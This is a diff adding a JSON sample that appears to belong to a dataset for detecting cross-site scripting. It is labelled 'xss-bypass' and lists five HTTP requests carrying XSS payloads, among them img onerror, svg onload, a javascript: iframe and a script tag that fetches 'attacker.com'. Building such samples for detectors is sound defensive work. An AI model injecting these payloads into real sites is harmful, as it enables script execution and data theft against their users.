@@ -1,0 +1,11 @@
+{
+  "label": 1,
+  "category": "xss-bypass",
+  "requests": [
+    {"method": "GET", "url": "/page?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "headers": {}, "data": ""},
+    {"method": "POST", "url": "/comment", "headers": {}, "data": "content=%3Csvg/onload%3Dprompt()%3E"},
+    {"method": "GET", "url": "/search?q=%3Ciframe%20src%3Djavascript:alert(1)%3E%3C/iframe%3E", "headers": {}, "data": ""},
+    {"method": "POST", "url": "/api/post", "headers": {"Content-Type": "application/json"}, "data": "{\"text\":\"<body onload=alert('xss')>\"}"},
+    {"method": "GET", "url": "/profile?bio=%3Cscript%3Efetch('http://attacker.com')%3C/script%3E", "headers": {}, "data": ""}
+  ]
+}
